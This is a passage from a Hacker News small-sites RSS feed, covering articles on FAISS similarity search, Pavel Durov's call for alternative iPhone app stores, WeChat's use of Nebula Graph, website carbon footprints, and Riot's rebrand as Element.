<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Measuring the similarity between vectors or arrays is a calculation that we encounter often while developing recommendation systems or other machine learning models. This often involves performing similarity searches on entire datasets that can be computationally expensive. For systems that require such calculations to happen online in real-time, this can be a major issue and is something we often have to deal with at Caboom.</p><p><br>Luckily, we are not the only ones faced with this problem and there are open-source libraries like <a href="https://github.com/facebookresearch/faiss">FAISS</a> that have been developed to solve this exact problem by the Facebook AI Research team.</p><p>‍</p><p>FAISS or <strong>F</strong>acebook <strong>AI</strong> <strong>S</strong>imilarity <strong>S</strong>earch is a library written in the C++ language with GPU support. It also has Python bindings so that it can be used with Numpy, Pandas, and other Python-based libraries. Its algorithmic enhancements that vastly narrow down the search space for a vector's k-nearest neighbors allow it to have much faster similarity search between vectors as compared to existing libraries like Scikit Learn. This technique is called Approximate Nearest Neighbours (ANN) search, and sacrifices some precision to obtain the vast speedups.&nbsp;</p><p>Compared to other ANN libraries FAISS implements various vector compression, partitioning, and indexing techniques, especially by making use of the parallelism enabled by GPUs to make similarity search lookups more efficient. We will mostly be focusing on its indexing features and how that leads to fast similarity search in recommender systems. There are several other methods and optimizations in FAISS which can’t be covered by this blog alone. For a detailed overview of how its internal mechanism works, different&nbsp; and the previous work it builds upon please refer <a href="https://github.com/facebookresearch/faiss/wiki">here</a>.</p><p>To show the speed gains obtained from using FAISS, we did a comparison of bulk cosine similarity calculation between the FlatL2 and IVFFlat indexes in FAISS and the brute-force similarity search used by one of the most popular Python machine learning frameworks Scikit-learn.&nbsp;</p><p>A dataset of 20k movies was used for this comparison, with the similarity search performed on vectors obtained from the various genres of the movie.The task was to select the top 10 most similar movies for each of the 20k movies from a candidate pool ranging from 0 to 1000 movies. </p><p>‍</p><figure id="w-node-0ec5b7e06d99-2fefdd35"><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0c174333f77039795e2d8a_Screen%20Shot%202020-07-13%20at%2013.56.15.png" alt="Speed comparison between two FAISS indexes"></p></figure><figure id="w-node-cf497c7d8071-2fefdd35"><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0c17886b4272e3e7bd2790_Screen%20Shot%202020-07-13%20at%2013.56.35.png" alt=""></p></figure><p>As seen from the plots above, the time taken to perform the similarity search increases linearly for Scikit-learn to a few seconds, while that for the Flat index based search is an order of magnitude faster.&nbsp;</p><h2>Basic Indexes</h2><p>As stated above the main strength of FAISS is the speed with which it can perform similarity searches on billions of vectors at the cost of some precision. This is possible because of the implementation of indexes in FAISS that the whole package is optimized for. These indexes store a set of vectors and provide search functions in these sets with various vector comparison algorithms. One good way of understanding them is to think of them like the indexes used in databases to make queries faster.&nbsp;</p><p>We will now go through an example implementation of creating a FAISS index.&nbsp;</p><h3>Flat Index</h3><p>The simplest implementation of the index in FAISS is the <strong>IndexFlatL2 index</strong>. It is an exact search index that encodes the vectors into fixed-size codes. As the name suggests it is an index that compares the L2 (euclidean) distance between vectors and returns the top-k similar vectors. During the search, all the indexed vectors are decoded sequentially, and compared to the vector whose nearest neighbors we are being calculated. This vector is also called the <strong>query vector</strong>.&nbsp;</p><p>This is different from how similarity search is done in libraries like Scikit-learn, as we have to choose the kind of similarity we are measuring and select the index accordingly. FAISS also optimizes how the index vectors are stored in memory or disk by using a tree data structure that hugely improves the search time.</p><p>The following code shows the process of defining the index vector size, initiating the IndexFlatL2 index, adding vectors to the index and saving the index into disk.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8a67e212a15625c1ca46_Image1.png" alt=""></p></figure><p>‍</p><p>We can reuse the saved index later for searching a vector's nearest neighbors. The following code snippet shows how to load the index and perform nearest neighbor search on it.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8a7a898b077ff2c73e44_image%202.png" alt=""></p></figure><p>‍</p><p>Output:<br>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8a87898b072b2ac73e45_image%203.png" alt=""></p></figure><p>‍</p><p>‍</p><p>The output shows the resulting indexes and distances for the first five vectors of an index. In the second “distances” matrix we can see that the vectors have their nearest neighbors at the beginning of the array row, with a distance of 0 with itself and increasing in value as we move towards the end.&nbsp;</p><p>Another thing to remember is that in this case the index of the arrays is set automatically by FAISS in increasing order like the "auto_increment" column in SQL databases. It is advisable to use either a mapper with FAISS to real indexes or use a FAISS provided index setting which will come up further along.</p><h3>Cosine Similarity Measurement</h3><p>Although calculating Euclidean distance for vector similarity search is quite common, in many cases <strong>cosine similarity</strong> is preferred. In FAISS we don't have a cosine similarity method but we do have indexes that calculate the inner or dot product between vectors. For example, the <strong>IndexFlatIP</strong> <strong>index</strong>. We can then take advantage of the fact that cosine similarity is simply the dot product between normalized vectors.&nbsp;</p><p>The code snippet below shows how this can be implemented. Partition-based Index</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8aa4dd31940e941cddbd_image%204.png" alt=""></p></figure><p>Another class of indexes in FAISS are partition-based indexes that speed up searches by partitioning the index into clusters and limiting the search to only a few clusters. This method however is not exact as there is no guarantee that the nearest neighbors will be in the clusters searched in.&nbsp;&nbsp;</p><p><br>An example of an index that uses partitioning techniques to make the search space a lot less and far more efficient is <strong>IndexIVFFlat index</strong>.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8aaf04e10128d6d54b3c_image%205.png" alt=""></p></figure><p>‍</p><p>The search operation can be carried out in the same way as earlier indexes. However, in the IVFFlat index we define the “nprobe” hyperparameter to limit the search to only the defined number of clusters nearest to the query vector. This is also an example of how different indexes can be compounded to form a single index.</p><h3>Principal Component Analysis (PCA)</h3><p>We’ve looked at the use cases for some of the basic algorithms in FAISS. This section looks at a method called PCA. It is an algorithm that is popular in unsupervised machine learning that is used to reduce the vector dimensions using <strong>Principal Components</strong> of the vector space.</p><p>In FAISS, PCA is generally followed by indexes like IndexFlatL2 or IndexIVFFlat and they are linked with the help of the <strong>IndexPreTransform</strong> function.&nbsp;One requirement of this method is that the dimension of a vector needs to be a multiple of 4.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8ab9ec95620e8410fb11_image%206.png" alt=""></p></figure><h3>Dimension Remapping</h3><p>PCA allows us to reduce the dimensions but what if we want to increase the dimensionality of the vectors? We may encounter this scenario if we want to use an IndexIVFFlat index for instance. In this case, the dimensionality should ideally be a multiple of 4. FAISS allows us to do this through the <strong>RemapDimensionTransform </strong>method.As an example, let us suppose we have a vector of size 150 that we need to use with an IndexIVFFlat index. The way we transform this to a size that is a multiple of 4 (152) is given below.</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8ac81fd412abe2e2dab8_image%207.png" alt=""></p></figure><p>‍</p><div><p>What next?This brings us to the end of Part 1 of this discussion on using the FAISS library from Facebook. Here we looked at the speedup it provides when compared to the similar methods used in Scikit-learn, and how FAISS optimizes this through various indexes. In Part 2 we will go beyond the basic indexing methods and look at more advanced versions. We will also look at the GPU support in FAISS, and how to make the calculations even faster by leveraging them.</p><p>‍</p></div></div></div>]]>
            </description>
            <link>https://caboom.ai/blog/speeding-up-similarity-search-in-recommender-systems-using-faiss-basics-part-i</link>
            <guid isPermaLink="false">hacker-news-small-sites-23843752</guid>
            <pubDate>Wed, 15 Jul 2020 11:32:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pavel Durov wants a law to make Apple allow iPhone users install other app store]]>
            </title>
            <description>
<![CDATA[
Score 42 | Comments 6 (<a href="https://news.ycombinator.com/item?id=23843296">thread link</a>) | @vvpvijay
<br/>
July 15, 2020 | https://androidrookies.com/telegram-developer-wants-a-law-to-make-apple-allow-iphone-users-to-install-apps-from-other-app-stores/ | <a href="https://web.archive.org/web/*/https://androidrookies.com/telegram-developer-wants-a-law-to-make-apple-allow-iphone-users-to-install-apps-from-other-app-stores/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-8890"><div><div><div><p>VK social networking website and Telegram messenger App founder and developer, Pavel Durov wants Apple to let iPhone users install different App stores other than Apple App Store. Not only that, but he also wants legislation to make this happen.</p><p>Speaking at the panel discussion with Russian Prime Minister Mikhail Mishustin and representatives of the IT industry in Innopolis, Telegram Manager and Vice President, Ilya Perekopsky said that Apple and Google are holding back the development of startups by charging a tax of 30 percent commission from app developers. Immediately after Perekopsky’s speech,&nbsp;Durov published an article in which he called for legislation mandating Apple to be legally obliged to allow users to install an alternative App Store on the iPhone. Durov says that Tim Cook, Apple CEO should be obligated to this at the legislative level.</p><p>Durov is taking the bull by its horn. Apple has been successful because of its closed technology. It not only does not allow any other App store to be installed on iPhones but it also takes action against any iPhone jailbreaks that happen. We all know that the <a href="https://androidrookies.com/unc0ver-jailbreak-tool-for-iphone-released-works-on-all-ios-versions-including-ios-13-5/">uc0ver team released a jailbreak</a> exploiting the previously unknown vulnerability in iOS just hours after Apple released iOS 13.5. The <a href="https://androidrookies.com/kernel-vulnerability-unc0ver-jailbreak-patched-as-apple-releases-ios-13-5-1/">iPhone jailbreak was shut down in iOS 13.5.1</a> within days by Apple. Many private iPhone App stores exist like Cydia, Xabsi, etc but they work only on jailbroken iPhones.</p><p>Much of Apple’s profit is from selling content on its App stores. In fact, Apple’s App Store platform grossed around $50 billion for App store in 2019, according to an analysis by CNBC. Apple takes 30 percent commission from App developers to make their apps available on Apple Store. Last year it paid $35 billion to developers from the App store revenue and kept $15 billion for itself.</p><p>Durov has reasons for being mad at Apple for not allowing other App stores. Durov says that Russian startups fail to make money by paying 30% to Apple. “Preventing two supranational corporations from collecting taxes from all of humanity is not an easy task. Corporations employ thousands of lobbyists, lawyers, and PR agents, and their budgets are unlimited. At the same time, app developers are scattered and scared, as the fate of their projects depends entirely on the favor of Apple and Google,” wrote Pavel Durov.</p><p>Durov also has a personal bias for wanting Apple to open up its iOS for alternative App stores. In 2016, Apple banned the Telegram team from launching its own game platform. This hurt Durov and Telegram’s ambitions, “We had to remove the telegram games catalog that we had already created and almost the entire platform interface, otherwise Apple threatened to remove Telegram from the AppStore.”</p><p>Recently, <a href="https://androidrookies.com/apple-threatens-to-remove-hey-com-email-app-unless-it-pays-outrageous-cuts-to-them/">email client, Hey.com</a> had a similar experience with Apple regarding publishing their App on the Apple App store.</p></div></div></div></article></div>]]>
            </description>
            <link>https://androidrookies.com/telegram-developer-wants-a-law-to-make-apple-allow-iphone-users-to-install-apps-from-other-app-stores/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23843296</guid>
            <pubDate>Wed, 15 Jul 2020 10:21:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One Trillion Connections – Nebula Graph Database at WeChat]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23843038">thread link</a>) | @jamie-vesoft
<br/>
July 15, 2020 | https://nebula-graph.io/posts/nebula-graph-for-large-social-network/ | <a href="https://web.archive.org/web/*/https://nebula-graph.io/posts/nebula-graph-for-large-social-network/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><p><img src="https://nebula-graph.io/images/writer.png" width="16px" height="16px">
<span>Li Benli</span></p><p><img src="https://nebula-graph.io/images/calendar.png" width="16px" height="16px">
<span>2020-07-02</span></p></div><p><img src="https://user-images.githubusercontent.com/57335825/87518187-cdb4d200-c634-11ea-9dc4-264001420b55.png" alt="Nebula Graph for Large Social Network: Practices at WeChat"></p><p>WeChat is one of the social network apps in the world that deals with large scale heterogeneous graphs. The dataset to be processed has:</p><ul><li>One trillion edges/connections</li><li>A total dataset of 150TB</li><li>An hourly update of 100 billion connections,</li></ul><p>And it is a huge challenge. The team at WeChat encountered problems when using <a href="https://github.com/vesoft-inc/nebula">Nebula Graph</a>, an open source distributed graph database.</p><p>However, through deep customization capabilities in the database, the team has realized some useful on-demand features. They include big data storage, data import for large data sets with a fast performance, version control, rollback at the second level, and access to the database at millisecond level.</p><h2 id="the-challenges-facing-large-internet-companies">The Challenges Facing Large Internet Companies</h2><p>Most well-known graph databases are not capable of dealing with truly big data. For example, the community version of <a href="https://neo4j.com/">Neo4j</a> provides single-host service and is widely adopted in the knowledge graph area. However, when it comes to a very large data set this solution misses the mark. And large data sets are increasingly common in today’s business world.</p><p>Plus, there are issues like data consistency and disaster recovery to consider if you choose a multi-copy implementation. <a href="https://janusgraph.org/">Janus Graph</a> has solved the big data storage problem by using external metadata management, kv storage and indexes. Yet the performance has been widely criticized. As a result, most graph database solutions that the WeChat team evaluated are many times better than Janus Graph in terms of performance.</p><p>Some Internet companies build their own databases. These self-developed solutions are catering to their own business requirements, rather than for general graph scenarios. So, they support only a limited proportion of query syntaxes.</p><h3 id="geabase-from-ant-financial">GeaBase from Ant Financial</h3><p><a href="https://tech.antfin.com/products/GEABASE">GeaBase</a> is another option, mainly used in the finance industry. It features a self-developed query language, pushdown computation and millisecond latency. The main scenarios for its usage include risk management in financial organizations. To this end, it supports a transaction network with trillions of edges/relationships, storing real-time transaction data, real-time fraud detection.</p><p>It is also useful for recommendation engines. This includes applications like stocks and securities recommendations. Its Ant Forest features the capability to store trillions of nodes, strong data consistency, and low latency querying. It also has a GNN feature for Dynamic Graph CNN, for online inference based on dynamic graphs.</p><h3 id="igraph-from-alibaba">iGraph from Alibaba</h3><p>There is also iGraph, a graph indexing and query system. It stores user behavior information and serves as one of the four backbone middle platforms in Alibaba. iGraph has adopted Gremlin as its graph query language for real-time queries of e-commerce relationships.</p><h3 id="bytegraph-from-bytedance-aka-tiktok">ByteGraph from ByteDance (a.k.a TikTok)</h3><p>By adding a cache layer to the kv layer, ByteGraph splits the relationships into B+ trees for efficient access to edges and data sampling. The structure is like the TAO of Facebook.</p><h2 id="architecture-of-the-wechat-big-data-solution">Architecture of the WeChat Big Data Solution</h2><p>The WeChat team has come up with the following architecture to solve the big data storage and processing problem.</p><p><img src="https://user-images.githubusercontent.com/57335825/86352447-a87a9980-bc1a-11ea-83c6-47a481675e9e.png" alt="Architecture of the WeChat Big Data Solution"></p><h2 id="why-nebula-graph">Why Nebula Graph?</h2><p>As seen in the architecture above, a graph database is the main component of the solution. WeChat ended up selecting Nebula Graph as the starting point of its journey in exploring graph databases.</p><p>WeChat found Nebula Graph had the most potential for handling huge dataset storage needs based on the capability of dataset partitioning and an independent relationship storage. It also had pushdown computation and MPP optimization based on the strong consistency storage engine. Finally, the team had extensive experience in the graph database field and a proven model for abstraction for big data.</p><h2 id="problems-in-practice-nebula-graph">Problems in Practice Nebula Graph</h2><h3 id="insufficient-memory">Insufficient Memory</h3><p>The WeChat team encountered memory issues. At its essence, it was a problem of performance versus resources. Memory occupation is an un-neglectable issue in an application dealing with large scale datasets.
There are a couple of components in RocksDB that contribute to memory usage. There are Block cache, Indexes and bloom filters. There are also Memtables and Blocks pinned by iterators.
So, the WeChat team moved to optimize memory utilization. It began with block cache optimization. To do this, it adopted a global LRU cache to control the cache occupation of all RocksDB instances in a machine.</p><p>Then the team did a bloom filter optimization. An edge is designed as a key-value pair and stored in RocksDB. If all keys are stored in a bloom filter and each key occupies 10bit, then the memory required by the entire filter will exceed the machine memory by a large margin.</p><p>The team observed that most of the time the requests are to acquire a list of edges for a specific node. Therefore, the team adopted a prefix bloom filter. Another optimization was made to create indexes for properties on vertices, which enables acceleration for most requests. Finally, the memory occupation of a single-host filter is at the gigabyte level without sacrificing the speed of most requests.</p><h3 id="version-control">Version Control</h3><p>There are several business requirements in practice for version control. It offers graph data fast rollback, periodic full data import, and automatic access to the latest versioning data. The team has classified data sources into two categories.</p><p>Recurring data, for example, generates a list of similar users by day and the data takes effect after being successfully imported. Then there is History data and real-time data. For example, there is refresh history data by day and the team combines the history data with real-time data as full data to be imported.</p><p>Following is the data storage model in RockDB.</p><p>Vertex Storage Model:</p><p><img src="https://user-images.githubusercontent.com/57335825/86352518-c516d180-bc1a-11ea-9ea3-25a774e6478c.png" alt="Vertex Storage Model in RocksDB"></p><p>Edge Storage Model:</p><p><img src="https://user-images.githubusercontent.com/57335825/86352600-e2e43680-bc1a-11ea-819c-6161cdf719b3.png" alt="Edge Storage Model in RocksDB"></p><p>Timestamp is used as the versioning method for real-time data. The version of imported data is specified manually. In practice, the team has three options for version control. First, reverse_versions, where the list of versions is to be kept for rollback. Second is active_version, where the version is accessed by users’ requests. And finally, max_version, where data is reversed after a certain version. The reversed data is the combination of the history data and the real-time data.</p><p>Using the three options, the team can manage offline data and online data efficiently. The data that is no longer used is cleared from the disk during the next compaction.
In this way, the application can update the data version without in the background. And the data rollback can be completed within seconds.</p><p>Below are some examples:</p><ul><li>Keep three versions of data and activate one of them</li></ul><p><code>alter edge friend reserve_versions = 1 2 3 active_version = 1</code></p><ul><li>Data sources are history data and real-time write data</li></ul><p><code>alter edge friend max_version = 1592147484</code></p><h2 id="fast-full-data-import">Fast Full Data Import</h2><p>Conducting data imports at a large scale is a common practice. The import requests, without any optimization, would not only affect requests in production, but take longer than a day to complete. So, it became an urgent requirement to improve import speed. SST Ingest is a commonly adopted method to achieve fast import. The WeChat team adopted something similar.</p><p>The team generated SST files offline via scheduling Spark tasks. Storage nodes pull the data required and ingest the data to the graph database. And, then there is access to the latest versioning data via the version control request. The import process takes several hours to complete, which is fast. And it does not affect requests to the graph database because the computation is mainly offline.</p><p>The shared-nothing architecture is a widely discussed method for ensuring horizontal scalability. It requires programming skills to implement the architecture in practice. The meta cache is encapsulated with <code>shared_ptr</code> and is frequently accessed, making it a warm bed for atomic operation clashing. To realize shared-nothing, the WeChat team copied each meta cache as a local thread. This <a href="https://github.com/vesoft-inc/nebula/pull/2165">pull request</a> provides details.</p><p>It has been a long journey to achieve graph database utilization. And it is one that continues with success in large part by overcoming obstacles.</p><h2 id="you-might-also-like">You Might Also Like</h2><ul><li><a href="https://nebula-graph.io/posts/detect-corona-virus-spreading-with-graph-database/">Detect Corona Virus Spreading With Graph Database Based on a Real Case</a></li><li><a href="https://nebula-graph.io/posts/review-on-graph-databases/">A Review of Graph Databases</a></li></ul><blockquote><span>Like what we do ? Star us on GitHub.</span>
<a href="https://github.com/vesoft-inc/nebula" onclick="gtag('event','Link Click',{event_category:'Engagement',event_label:'Star via blogbody'});">https://github.com/vesoft-inc/nebula</a></blockquote></section></div>]]>
            </description>
            <link>https://nebula-graph.io/posts/nebula-graph-for-large-social-network/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23843038</guid>
            <pubDate>Wed, 15 Jul 2020 09:41:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[This Website Is Killing the Planet]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 11 (<a href="https://news.ycombinator.com/item?id=23842225">thread link</a>) | @brokebroadbeat
<br/>
July 15, 2020 | https://visitmy.website/2020/07/13/this-website-is-killing-the-planet/ | <a href="https://web.archive.org/web/*/https://visitmy.website/2020/07/13/this-website-is-killing-the-planet/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>For a while I’ve been intending to make my website more sustainable, but I succumbed, as I often do, to the human trait of sloth. But this morning after reading <a href="https://alistapart.com/article/webwaste/">Gerry McGovern’s post on webwaste</a>, I thought I’d procrastinated long enough.</p>

<p>So I ran a web page performance test and got some <a href="https://www.webpagetest.org/result/200713_XX_e2daed33a24cd8a099d930fc373b1083/">grim results</a>: my website takes over a minute to load on a Moto G4 on using 3G data networks. It’s just as bad <a href="https://www.webpagetest.org/result/200713_6E_4e249b485a45882604420068caa21ae0/">using a desktop PC in Nottingham on 1.5Mbps DSL</a>. My website is bloated with large images and a bunch of JavaScript, which means it’s eating up lots of energy transmitting those bits and bytes.</p>

<p>But how much energy? I used the <a href="https://www.websitecarbon.com/">Website Carbon Calculator</a> to find out. Turns out that</p>

<ul>
  <li>6.90g of CO2 is produced every time someone visits the homepage</li>
  <li>it emits the amount of carbon that 4 trees absorb in a year, and</li>
  <li>it uses enough electricity to drive an electric car 1,116km</li>
</ul>

<p>Eugh. That’s disgusting. For each year my website has been online, I should have planted 4 trees just for the homepage alone. But, instead, my laziness has filled the atmosphere with more and more carbon.</p>

<p>I have to do something, this has gone on long enough, so I’m committing to some actions.</p>

<ol>
  <li>I’ll move my site to a web hosting provider using renewable energy, one that’s listed on the <a href="https://www.thegreenwebfoundation.org/directory/">Green Web Foundation’s directory</a>. <strong>DONE</strong></li>
  <li>I’ll compress and optimise the images on my site using <a href="https://imageoptim.com/mac">ImageOptim</a>. <strong>DONE</strong></li>
  <li>I’ll get rid of <a href="https://github.com/samesies/barber-jekyll">my energy-guzzling site theme</a> until I can introduce one that’s lightweight and accessible. <strong>DONE</strong></li>
  <li>Going forward, my website will enshrine the principles of the <a href="https://www.sustainablewebmanifesto.com/">Sustainable Web Manifesto</a>. <strong>SIGNED</strong></li>
  <li><strong>NEW</strong>: I’ll pay for some trees to be planted that’ll reduce the impact of my website’s carbon footprint going forward.</li>
</ol>

<p>To show my committment to being a good web citizen, I’ll add the <a href="https://www.websitecarbon.com/badge/">Website Carbon Badge</a> to all pages (<strong>DONE</strong>) and the <a href="https://www.thegreenwebfoundation.org/green-web-check/">Green Web Foundation’s renewable hosting badge</a> (<strong>DONE</strong>). Once I’ve improved things, I’ll add a <a href="https://carbontxt.org/">carbon.txt</a> (<strong>DONE</strong>).</p>

<p>One day I’ll actually get around to building a solar-powered battery bank and run my site off my home connection, but until then I’m taking small steps to remove, minimise and clean-up my presence on the web.</p>

<p>What’s the carbon footprint of your website? What steps will you take to reduce it?</p>

<h2 id="further-reading">Further reading</h2>

<ul>
  <li><a href="https://alistapart.com/article/webwaste/">Webwaste</a></li>
  <li><a href="https://pxlnv.com/blog/bullshit-web/">The bullshit web</a></li>
  <li><a href="https://www.wholegraindigital.com/blog/sustainable-web-design/">3 steps to creating zero carbon websites</a></li>
  <li><a href="https://solar.lowtechmagazine.com/2018/09/how-to-build-a-lowtech-website.html">How to build a low-tech website</a></li>
  <li><a href="https://www.thegreenwebfoundation.org/news/notes-for-greening-internet-governance-at-eurodig/">Greening Internet governance: environmental sustainability and digital transformation</a></li>
</ul>

  </div>
</article>



      </div>
    </div></div>]]>
            </description>
            <link>https://visitmy.website/2020/07/13/this-website-is-killing-the-planet/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23842225</guid>
            <pubDate>Wed, 15 Jul 2020 07:15:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Riot is now Element]]>
            </title>
            <description>
<![CDATA[
Score 413 | Comments 254 (<a href="https://news.ycombinator.com/item?id=23842179">thread link</a>) | @J_tt
<br/>
July 15, 2020 | https://element.io/blog/welcome-to-element/ | <a href="https://web.archive.org/web/*/https://element.io/blog/welcome-to-element/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Hi everyone,</p><p>We are incredibly excited to announce that <strong>Riot is now Element</strong>! </p><p>In fact we have simplified all our naming: Element is also the name for New Vector (the company behind Riot) while Modular, our flagship Matrix hosting service, has become Element Matrix Services.</p><p>For those discovering us for the first time: Element is the flagship secure collaboration app for the decentralised <a href="https://matrix.org/">Matrix</a> communication network. &nbsp;Element lets you own your own end-to-end encrypted chat server, while still connecting to everyone else in the wider Matrix network.</p><figure><img src="https://element.io/blog/content/images/2020/07/element-logo.png"></figure><p><br>What’s more, <strong>RiotX is now out of beta</strong> - our next generation Matrix client for Android has flown the nest and spread its wings as Element - replacing the old Riot Android app at last!</p><p>This name change has been a long time in the making. As we explained when we announced the rebrand <a href="https://blog.riot.im/the-world-is-changing/">a few weeks ago</a>, we’ve had major issues with a certain gigantic games company which has blocked us from being able to trademark Riot or even Riot.im - a huge issue when it comes to defending users against abusive forks of the app. Secondly, people incorrectly assume Riot refers to violence, rather than the more constructive forms of chaos we had in mind. Lastly, it made sense in the early days of Matrix to have different brands to illustrate the different roles of Riot, Modular and New Vector in the ecosystem… but nowadays there are loads of Matrix clients, Matrix hosting providers and companies building on Matrix - and so all New Vector’s different names were just causing confusion. &nbsp;</p><h3 id="so-why-element">So, why Element?</h3><p>We want a name that reflects the emphasis on simplicity and clarity that we aimed for when designing RiotX; a name that highlights our single-minded mission to make Element the most elegant and usable mainstream comms app imaginable. &nbsp;Riot had a pretty chequered history, spending much of its life in beta, with intermittent attention to design until we hit 1.0 last year - but nowadays we have a dedicated full-time design team working on Element, who not only design the graphics but the overall behaviour of new features in the app. &nbsp;This is not an easy task, given it turns out the hardest bits of end-to-end encryption are almost entirely UX challenges. &nbsp;What’s more, presenting a global decentralised communication network as simply as a centralised communication island is surprisingly tricky. &nbsp;However: we have been making massive progress, to the extent that we are barely recognisable as the Riot of the past. Element reflects a clean start to focus monomaniacally on mainstream usability in future.</p><p>We also want a name that better evokes the idea of data ownership and self-sovereignty. &nbsp;An element is the smallest indivisible thing in a system - yet one which can stand alone. &nbsp;You can customise it, control it and make it your own - you can literally be in your Element!</p><p>Moreover, we want a name that will be future-proof for peer-to-peer Matrix. &nbsp;As Matrix.org announced last month, <a href="https://matrix.org/blog/2020/06/02/introducing-p-2-p-matrix">P2P Matrix is in heavy development</a> - and we can see a world where Element will literally be an element of Matrix, running your own homeserver within the app, so you can communicate if you don’t have a server… or even Internet. In fact, we published the first experimental build of <a href="https://matrix.org/blog/2020/07/10/this-week-in-matrix-2020-07-10#riot-ios-p2p-demo">P2P Riot for iOS</a> on Testflight a few days ago - so we can clearly see a future where we will be in our P2P element!</p><p>Finally, we think it’s a cool name :D &nbsp;It fits in nicely with the term Matrix while not being as nerdy as Vector. &nbsp;We’re obviously aware that Element is (once again) both a dictionary word and a mathematical term - but in practice, looking at search results for Element right now, the top hits are for dictionary sites(!) and the field is wide open. &nbsp;Conversely, in a virgin browser on VPN, Riot is the 4th hit on Google for Riot; second only to a certain games company. &nbsp;In other words, we’ve shown that we can successfully adopt dictionary words - and if you do find yourself lost searching in a maze of mathematics, just throw in the word ‘chat’ to get back on track. &nbsp;(For all the linear algebraists who are spitting with rage at this point: we promise we’ll make it up to you by finally sorting out <a href="https://github.com/matrix-org/matrix-react-sdk/pull/3251">latex support</a> in Element!)</p><p>This change is inevitably going to be disruptive, and we’re painfully aware that we’ve spent four years building up Riot’s reputation and persuading everyone to move their friends, families and teams onto it. &nbsp;To reiterate what we said when we announced the change, we know that many people reading this will have put their necks on the line to get folks to adopt Riot, and we really appreciate how frustrating it may be to have to explain the change to your users. &nbsp;However, this is unquestionably the right time to shed our skin and make the change, and we hope folks will grow to love Element much more than they ever did Riot. &nbsp;To aid the transition, we’ve named the installable apps “Element (Riot.im)” for a while to help people get reoriented (e.g. when searching by name for Riot).</p><p>Last but not least: Element isn’t just a new name - it comes with a massive suite of improvements across Android, iOS and Web.</p><p>We’ll write about these in full over the coming days, but the big headlines are that RiotX (our ground-up rewrite of Riot Android) has exited beta, and replaces Riot Android as Element - complete with VoIP calls and Widget support! Riot Android users will magically autoupgrade into Element; the old RiotX app will be retired in due course. FDroid is likely releasing Element as an entirely new app. &nbsp;Meanwhile On iOS we now have full support for iOS 13, complete with entirely new push notification support (thanks to Apple’s nightmarish <a href="https://appleinsider.com/articles/19/09/05/secure-messaging-apps-working-to-comply-with-apples-ios-13-privacy-changes">deprecation of PushKit</a>).</p><figure><img src="https://element.io/blog/content/images/2020/07/RiotX-1.png"><figcaption>The App Formerly Known As RiotX!</figcaption></figure><p>On Element Web, we’ve given the UI a massive refresh, with a beautiful new font (<a href="https://rsms.me/inter/">Inter</a>) giving much improved legibility, and we’ve <strong>completely</strong> rewritten the Room List control - adding in room previews(!!), alphabetic ordering, resizable lists, improved notification UI and more. We’ve also landed the first phase of further improving the end-to-end encryption setup process - letting users generate a recovery key rather than forcing them to select a recovery passphrase when setting up E2EE for the first time (the next phase is to delay setting up E2EE until the user actually starts talking in encrypted rooms).</p><figure><img src="https://element.io/blog/content/images/2020/07/Screenshot-2020-07-15-at-00.54.45.png"></figure><p>So there you have it. Welcome to a whole new beginning for Riot: welcome to your new Element, one where mainstream Matrix users will enjoy themselves too - and which will pave the way for wider adoption of open, secure, decentralised communication via Matrix throughout the world.</p><p>- Matthew, Amandine, and the whole Element team.</p><p>P.S. Check out our <a href="https://element.io/">all-new website</a> and in particular the <a href="https://element.io/previously-riot">migration page</a> for much more information about our brave new world!<br></p></div></div>]]>
            </description>
            <link>https://element.io/blog/welcome-to-element/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23842179</guid>
            <pubDate>Wed, 15 Jul 2020 07:07:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Welcome to Element [Riot chat rebranded as Element]]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 3 (<a href="https://news.ycombinator.com/item?id=23842154">thread link</a>) | @ptman
<br/>
July 15, 2020 | https://element.io/blog/welcome-to-element/ | <a href="https://web.archive.org/web/*/https://element.io/blog/welcome-to-element/">archive.org</a>
